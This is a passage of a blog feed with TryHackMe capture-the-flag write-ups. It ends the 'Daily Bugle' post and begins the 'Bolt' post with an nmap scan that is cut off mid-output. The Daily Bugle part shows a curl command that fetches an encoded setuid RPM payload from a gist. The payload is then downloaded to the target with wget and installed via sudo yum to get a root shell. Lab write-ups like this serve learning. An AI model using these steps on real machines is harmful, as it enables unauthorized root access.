</code></pre></div><p>Looking around a bit more I saw <a href="https://evi1ox.github.io/post/%E6%BB%A5%E7%94%A8sudo%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">this other post</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -sfL https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm | base64 -d | gzip -d&gt; yumsploit.rpm

</code></pre></div><p>trying to run this on the remote machine seems to be failing, we&rsquo;ll generate the payload rpm locally(which means just run that command and serve in our local HTTP server the yumsploit.rpm file)</p>
<p>Then we just do wget to upload that file and will try to install it with <strong>sudo yum localinstall yumsploit.rpm</strong> and hope for the best:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ ssh jjameson@10.10.61.166                                                                                             <span style="color:#ae81ff">1</span> ⨯
jjameson@10.10.61.166<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Last login: Fri Aug <span style="color:#ae81ff">28</span> 21:48:55 <span style="color:#ae81ff">2020</span>
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls
user.txt
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ wget http://10.13.0.34:8000/yumsploit.rpm
--2020-08-28 21:51:03--  http://10.13.0.34:8000/yumsploit.rpm
Connecting to 10.13.0.34:8000... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">8267</span> <span style="color:#f92672">(</span>8.1K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/x-redhat-package-manager<span style="color:#f92672">]</span>
Saving to: ‘yumsploit.rpm’

100%<span style="color:#f92672">[====================================================================================</span>&gt;<span style="color:#f92672">]</span> 8,267       --.-K/s   in 0.003s  

2020-08-28 21:51:04 <span style="color:#f92672">(</span>2.79 MB/s<span style="color:#f92672">)</span> - ‘yumsploit.rpm’ saved <span style="color:#f92672">[</span>8267/8267<span style="color:#f92672">]</span>

<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ sudo yum localinstall yumsploit.rpm
Loaded plugins: fastestmirror
Examining yumsploit.rpm: sploit-1.0-1.x86_64
Marking yumsploit.rpm to be installed
Resolving Dependencies
--&gt; Running transaction check
---&gt; Package sploit.x86_64 0:1.0-1 will be installed
--&gt; Finished Dependency Resolution

Dependencies Resolved

<span style="color:#f92672">==============================================================================================================================</span>
 Package                      Arch                         Version                     Repository                        Size
<span style="color:#f92672">==============================================================================================================================</span>
Installing:
 sploit                       x86_64                       1.0-1                       /yumsploit                       8.5 k

Transaction Summary
<span style="color:#f92672">==============================================================================================================================</span>
Install  <span style="color:#ae81ff">1</span> Package

Total size: 8.5 k
Installed size: 8.5 k
Is this ok <span style="color:#f92672">[</span>y/d/N<span style="color:#f92672">]</span>: y
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : sploit-1.0-1.x86_64                                                                                        1/1 
  Verifying  : sploit-1.0-1.x86_64                                                                                        1/1 

Installed:
  sploit.x86_64 0:1.0-1                                                                                                       

Complete!
<span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ 

</code></pre></div><p>It seems to have succeded, let see if we have the expected way to rooting this room:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ ls -al /usr/local/bin/
total <span style="color:#ae81ff">12</span>
drwxr-xr-x.  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">17</span> Aug <span style="color:#ae81ff">28</span> 21:54 .
drwxr-xr-x. <span style="color:#ae81ff">12</span> root root  <span style="color:#ae81ff">131</span> Dec <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> ..
-rwsr-sr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">8744</span> Jan <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2019</span> pop
</code></pre></div><p>We have a <strong>pop</strong> file we can execute now!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ /usr/local/bin/pop
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># whoami</span>
root
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>jjameson<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span># 

</code></pre></div><p>We made it! we rooted it! Let&rsquo;s grab that flag and get ready for a deserved time off the screen.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># ls</span>
user.txt  yumsploit.rpm
<span style="color:#f92672">[</span>root@dailybugle ~<span style="color:#f92672">]</span><span style="color:#75715e"># cd ..</span>
<span style="color:#f92672">[</span>root@dailybugle home<span style="color:#f92672">]</span><span style="color:#75715e"># cd ..</span>
<span style="color:#f92672">[</span>root@dailybugle /<span style="color:#f92672">]</span><span style="color:#75715e"># ls</span>
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
<span style="color:#f92672">[</span>root@dailybugle /<span style="color:#f92672">]</span><span style="color:#75715e"># cd root</span>
<span style="color:#f92672">[</span>root@dailybugle root<span style="color:#f92672">]</span><span style="color:#75715e"># ls</span>
anaconda-ks.cfg  root.txt
<span style="color:#f92672">[</span>root@dailybugle root<span style="color:#f92672">]</span><span style="color:#75715e"># cat root.txt</span>
eec<span style="color:#f92672">{</span>REDACTED_ROOT_FLAG<span style="color:#f92672">}</span>fa6f79
</code></pre></div><p>A lot of failed attempts to get this one, but it was definitely fun! I learnt a lot by failing with my approaches, having to reasearch and finally being able to step by step root this room! I hope you enjoy it as well.</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Bolt_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/bolt_writeup/</link>
            <pubDate>Wed, 26 Aug 2020 21:34:28 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/bolt_writeup/</guid>
            <description>Bolt - THM Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thingy for Bolt TryhackMe&amp;rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
Enjoy!
 Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</description>
            <content type="html"><![CDATA[<h1 id="bolt---thm-room">Bolt - THM Room</h1>
<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thingy for Bolt TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)</p>
<p>Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/bolt">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
</ul>
<h2 id="task-1-what-port-number-has-a-web-server-with-a-cms-running">[Task 1] What port number has a web server with a CMS running?</h2>
<p>Let&rsquo;s fire up an <strong>nmap</strong> scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bolt<span style="color:#f92672">]</span>
└─$ nmap -A -sC -sV -T4 10.10.105.96

</code></pre></div><p>While nmap runs let&rsquo;s take a look at the IP on the browser to see if there is any page being served. We get the default apache page:</p>
<p><img src="https://i.imgur.com/zVMGPMS.png" alt="Apache2 Ubuntu default page"></p>
<p>and if we try to navigate to any other URL we can get the specific version:</p>
<p><img src="https://i.imgur.com/o5N22Ss.png" alt="Apache2 version"></p>
<p>Let&rsquo;s check nmap results:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bolt<span style="color:#f92672">]</span>
└─$ nmap -A -sC -sV -T4 10.10.105.96
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-26 20:22 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.105.96
Host is up <span style="color:#f92672">(</span>0.38s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp   open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
8***/tcp open  http    <span style="color:#f92672">(</span>PHP 7.2.32-1<span style="color:#f92672">)</span>
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 <span style="color:#ae81ff">404</span> Not Found
|     Date: Thu, <span style="color:#ae81ff">27</span> Aug <span style="color:#ae81ff">2020</span> 00:23:45 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Thu, <span style="color:#ae81ff">27</span> Aug <span style="color:#ae81ff">2020</span> 00:23:45 GMT
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 0531cf
|     &lt;!doctype html&gt;
|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
|     &lt;head&gt;
|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;
|     &lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/theme/base-2018/css/bulma.css?8ca0842ebb&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/theme/base-2018/css/theme.css?6cb66bfe9f&#34;</span>&gt;
|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;generator&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Bolt&#34;</span>&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#main-content&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vis
</span><span style="color:#e6db74">|   GetRequest: 
</span><span style="color:#e6db74">|     HTTP/1.0 200 OK
</span><span style="color:#e6db74">|     Date: Thu, 27 Aug 2020 00:23:44 GMT
</span><span style="color:#e6db74">|     Connection: close
</span><span style="color:#e6db74">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
</span><span style="color:#e6db74">|     Cache-Control: public, s-maxage=600
</span><span style="color:#e6db74">|     Date: Thu, 27 Aug 2020 00:23:44 GMT
</span><span style="color:#e6db74">|     Content-Type: text/html; charset=UTF-8
</span><span style="color:#e6db74">|     X-Debug-Token: e716a7
</span><span style="color:#e6db74">|     &lt;!doctype html&gt;
</span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en-GB<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;head&gt;
</span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>utf-8<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1.0<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;
</span><span style="color:#e6db74">|     &lt;link href=&#34;</span>https://fonts.googleapis.com/css?family<span style="color:#f92672">=</span>Bitter|Roboto:400,400i,700<span style="color:#e6db74">&#34; rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/theme/base-2018/css/bulma.css?8ca0842ebb<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/theme/base-2018/css/theme.css?6cb66bfe9f<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>generator<span style="color:#e6db74">&#34; content=&#34;</span>Bolt<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>canonical<span style="color:#e6db74">&#34; href=&#34;</span>http://0.0.0.0:8000/<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|     &lt;/head&gt;
</span><span style="color:#e6db74">|_    &lt;body class=&#34;</span>front<span style="color:#e6db74">&#34;&gt;
</span><span style="color:#e6db74">|_http-generator: Bolt
</span><span style="color:#e6db74">|_http-title: Bolt | A hero is unleashed
</span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span style="color:#e6db74">SF-Port8000-TCP:V=7.80%I=7%D=8/26%Time=5F46FCF0%P=x86_64-pc-linux-gnu%r(Ge
</span><span style="color:#e6db74">SF:tRequest,1EFB,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
SF:2020<span style="color:#ae81ff">\x</span>2000:23:44<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>X-Powered-By:<span style="color:#ae81ff">\x</span>20PHP
SF:/7<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\.</span>32-1<span style="color:#ae81ff">\+</span>ubuntu18<span style="color:#ae81ff">\.</span>04<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\+</span>deb<span style="color:#ae81ff">\.</span>sury<span style="color:#ae81ff">\.</span>org<span style="color:#ae81ff">\+</span>1<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20pu
SF:blic,<span style="color:#ae81ff">\x</span>20s-maxage<span style="color:#f92672">=</span>600<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:23:44
SF:<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>X-Debug-Toke
SF:n:<span style="color:#ae81ff">\x</span>20e716a7<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-GB<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>u
SF:tf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">20</span>
SF:content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Bolt<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\|\x</span>20A
SF:<span style="color:#ae81ff">\x</span>20hero<span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20unleashed&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;l
SF:ink<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https://fonts<span style="color:#ae81ff">\.</span>googleapis<span style="color:#ae81ff">\.</span>com/css<span style="color:#ae81ff">\?</span>family<span style="color:#f92672">=</span>Bitter<span style="color:#ae81ff">\|</span>Roboto
SF::400,400i,700<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
SF:0&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/bulma<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:?8ca0842ebb<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>styleshe
SF:et<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/theme<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>6cb66bfe9f<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>generator<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Bolt<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>canonical<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://0<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span>0:8000/<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body<span style="color:#ae81ff">\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>front<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>
SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;a<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#34;)%r(FourOhFourRequest,152B,&#34;</span>HTTP/1
SF:<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:
SF:23:45<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>X-Powered-By:<span style="color:#ae81ff">\x</span>20PHP/7<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\.</span>32-1
SF:<span style="color:#ae81ff">\+</span>ubuntu18<span style="color:#ae81ff">\.</span>04<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\+</span>deb<span style="color:#ae81ff">\.</span>sury<span style="color:#ae81ff">\.</span>org<span style="color:#ae81ff">\+</span>1<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20private,<span style="color:#ae81ff">\x</span>20m
SF:ust-revalidate<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:23:45<span style="color:#ae81ff">\x</span>20GMT
SF:<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>pragma:<span style="color:#ae81ff">\x</span>20no-cache
SF:<span style="color:#ae81ff">\r\n</span>expires:<span style="color:#ae81ff">\x</span>20-1<span style="color:#ae81ff">\r\n</span>X-Debug-Token:<span style="color:#ae81ff">\x</span>200531cf<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html
SF:&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
